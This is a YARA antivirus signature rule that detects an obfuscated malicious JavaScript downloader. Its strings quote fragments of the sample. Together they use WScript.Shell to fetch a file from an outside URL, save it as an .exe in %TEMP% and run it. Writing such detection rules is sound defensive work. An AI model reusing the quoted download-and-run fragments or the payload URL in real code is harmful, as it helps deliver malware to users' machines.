rule sig_20160328_c28244dd671cc101c9b0d064fd065a52 {
  meta:
    description = "datamaliciousorder - file 20160328_c28244dd671cc101c9b0d064fd065a52.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0cb0b26dee60f5c389d906b2c84ddb053e6ea1600bd65a32c1fa5ea63e614ca6"

  strings:
    $s1  = "function Kxrsf() {return Nxvprfv[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"wGocfs3cnb15uNW.exe\";};" fullword ascii
    $s2  = "do {WScript[Rwnbo](Cjcwxhjt() * 11)} while (Oilmdd[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Qqkfsikbn(Ousyzt, Xtwvaocw){return Ousyzt - Xtwvaocw;};" fullword ascii
    $s4  = "var Nxvprfv = function Ixqfuq() {return WScript[Wsepo](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Oilmdd[Dicrurx](\"GET\", \"http://vasundhara.in/ok2lka\", false);" fullword ascii
    $s6  = "function Znzupaqu() {return ((Edfseo == true) && (Edfseo == Qjfsnr)) ? 1 : Sffsuulyc;};" fullword ascii
    $s7  = "function Cqlmdvhndz(Yovxpy){Nxvprfv[\"Run\"](Yovxpy, Sffsuulyc, Sffsuulyc);};" fullword ascii
    $s8  = "Qjfsnr = true; " fullword ascii
    $s9  = "function Bauiheq(){return Almsmbx;};" fullword ascii
    $s10 = "function Pnhqsmg(){return Wsepo;};" fullword ascii
    $s11 = "function Rdkpaqftns(Msoek) {var Dfuynem = (1, 2, 3, 4, 5, Msoek); return Dfuynem;};" fullword ascii
    $s12 = "var Edfseo = false;" fullword ascii
    $s13 = " while (Rwdwwmdjs){" fullword ascii
    $s14 = "return Qqkfsikbn(Mrpyn, Mwmdmxpz);" fullword ascii
    $s15 = "var Tzhao = false;" fullword ascii
    $s16 = "function Cjcwxhjt(){return 22;};" fullword ascii
    $s17 = "var Zknixor = new this[\"Date\"]();" fullword ascii
    $s18 = "var Qjfsnr = false;" fullword ascii
    $s19 = "function Fducf()" fullword ascii
    $s20 = "Edfseo = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}